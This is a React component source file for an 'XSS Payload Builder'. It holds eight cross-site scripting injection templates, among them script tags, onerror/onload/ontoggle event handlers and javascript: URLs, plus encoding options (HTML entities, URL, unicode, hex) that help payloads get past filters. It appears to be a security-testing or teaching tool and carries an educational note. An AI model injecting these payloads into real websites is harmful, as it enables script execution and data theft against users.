import { useState } from 'react';
import { copyToClipboard } from '../utils/clipboard';
import CodeBlock from './CodeBlock';
import ErrorBoundary from './ErrorBoundary';

const templates = [
  {
    id: 'script',
    name: 'Script Tag',
    pattern: '<script>{code}</script>',
    contexts: ['html'],
    description: 'Basic script tag injection'
  },
  {
    id: 'img-onerror',
    name: 'Image Error Handler',
    pattern: '<img src=x onerror="{code}">',
    contexts: ['html'],
    description: 'Image tag with error event'
  },
  {
    id: 'svg-onload',
    name: 'SVG Onload',
    pattern: '<svg onload="{code}">',
    contexts: ['html'],
    description: 'SVG tag with onload event'
  },
  {
    id: 'iframe-src',
    name: 'Iframe JavaScript',
    pattern: '<iframe src="javascript:{code}">',
    contexts: ['html'],
    description: 'Iframe with JavaScript protocol'
  },
  {
    id: 'a-href',
    name: 'Anchor JavaScript',
    pattern: '<a href="javascript:{code}">Click</a>',
    contexts: ['html', 'url'],
    description: 'Anchor tag with JavaScript protocol'
  },
  {
    id: 'input-onfocus',
    name: 'Input Autofocus',
    pattern: '<input onfocus="{code}" autofocus>',
    contexts: ['html'],
    description: 'Input with autofocus trick'
  },
  {
    id: 'details-ontoggle',
    name: 'Details Toggle',
    pattern: '<details open ontoggle="{code}">',
    contexts: ['html'],
    description: 'Details with toggle event'
  },
  {
    id: 'body-onload',
    name: 'Body Onload',
    pattern: '<body onload="{code}">',
    contexts: ['html'],
    description: 'Body tag with onload event'
  }
];

const encodingOptions = [
  { id: 'none', name: 'None', transform: (str) => str },
  { id: 'html', name: 'HTML Entities', transform: (str) => str.replace(/[<>"'&]/g, (c) => `&#${c.charCodeAt(0)};`) },
  { id: 'url', name: 'URL Encoding', transform: (str) => encodeURIComponent(str) },
  { id: 'unicode', name: 'Unicode', transform: (str) => str.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('') },
  { id: 'hex', name: 'Hex', transform: (str) => str.split('').map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('') }
];

export default function PayloadBuilder() {
  const [selectedTemplate, setSelectedTemplate] = useState(templates[0].id);
  const [code, setCode] = useState('alert(1)');
  const [encoding, setEncoding] = useState('none');
  const [generatedPayload, setGeneratedPayload] = useState('');

  const handleGenerate = () => {
    const template = templates.find(t => t.id === selectedTemplate);
    const encoder = encodingOptions.find(e => e.id === encoding);

    if (!template || !encoder) return;

    let processedCode = code;
    if (encoding !== 'none') {
      processedCode = encoder.transform(code);
    }

    const payload = template.pattern.replace('{code}', processedCode);
    setGeneratedPayload(payload);
  };

  const currentTemplate = templates.find(t => t.id === selectedTemplate);

  return (
    <ErrorBoundary>
      <div className="max-w-4xl mx-auto">
        <div className="bg-white rounded-lg shadow-md border border-gray-200 p-6">
          <div className="mb-6">
            <h2 className="text-2xl font-bold text-gray-900 mb-2">
              XSS Payload Builder
            </h2>
            <p className="text-gray-600">
              Construct XSS payloads using different techniques and encoding methods.
            </p>
          </div>

          {/* Template Selection */}
          <div className="mb-6">
            <label className="block text-sm font-semibold text-gray-700 mb-3">
              1. Select Technique
            </label>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {templates.map((template) => (
                <button
                  key={template.id}
                  onClick={() => setSelectedTemplate(template.id)}
                  className={`p-4 text-left border-2 rounded-lg transition ${
                    selectedTemplate === template.id
                      ? 'border-primary-600 bg-primary-50'
                      : 'border-gray-200 hover:border-gray-300'
                  }`}
                >
                  <div className="font-semibold text-gray-900">{template.name}</div>
                  <div className="text-xs text-gray-600 mt-1">{template.description}</div>
                  <div className="text-xs text-gray-500 mt-2">
                    Context: {template.contexts.join(', ')}
                  </div>
                </button>
              ))}
            </div>
          </div>

          {/* Code Input */}
          <div className="mb-6">
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              2. Enter JavaScript Code
            </label>
            <input
              type="text"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="alert(1)"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 font-mono"
            />
            <p className="mt-2 text-xs text-gray-500">
              Enter the JavaScript code you want to execute (e.g., alert(1), alert(document.domain))
            </p>
          </div>

          {/* Encoding Selection */}
          <div className="mb-6">
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              3. Select Encoding (Optional)
            </label>
            <div className="grid grid-cols-2 md:grid-cols-5 gap-2">
              {encodingOptions.map((option) => (
                <button
                  key={option.id}
                  onClick={() => setEncoding(option.id)}
                  className={`px-4 py-2 text-sm border-2 rounded-lg transition ${
                    encoding === option.id
                      ? 'border-primary-600 bg-primary-50 text-primary-700 font-semibold'
                      : 'border-gray-200 hover:border-gray-300 text-gray-700'
                  }`}
                >
                  {option.name}
                </button>
              ))}
            </div>
          </div>

          {/* Generate Button */}
          <div className="mb-6">
            <button
              onClick={handleGenerate}
              className="w-full bg-primary-600 text-white px-6 py-3 rounded-lg hover:bg-primary-700 transition font-semibold text-lg"
            >
              Generate Payload
            </button>
          </div>

          {/* Generated Payload */}
          {generatedPayload && (
            <div className="mb-6">
              <label className="block text-sm font-semibold text-gray-700 mb-3">
                Generated Payload
              </label>
              <CodeBlock code={generatedPayload} language="html" />
            </div>
          )}

          {/* Template Preview */}
          {currentTemplate && (
            <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
              <h3 className="text-sm font-semibold text-gray-700 mb-2">
                Template Pattern
              </h3>
              <code className="text-sm text-gray-700 font-mono block mb-3">
                {currentTemplate.pattern}
              </code>
              <p className="text-xs text-gray-600">
                The <code className="bg-gray-200 px-1 rounded">{'{code}'}</code> placeholder will be replaced with your JavaScript code.
              </p>
            </div>
          )}

          {/* Educational Note */}
          <div className="mt-6 bg-blue-50 border-l-4 border-blue-400 p-4">
            <p className="text-sm text-blue-700">
              <strong>Educational Note:</strong> Different XSS techniques work in different contexts.
              Event handlers (onerror, onload) work in HTML context, while JavaScript protocol works in URL context.
              Understanding these contexts is crucial for both finding and preventing XSS vulnerabilities.
            </p>
          </div>
        </div>
      </div>
    </ErrorBoundary>
  );
}
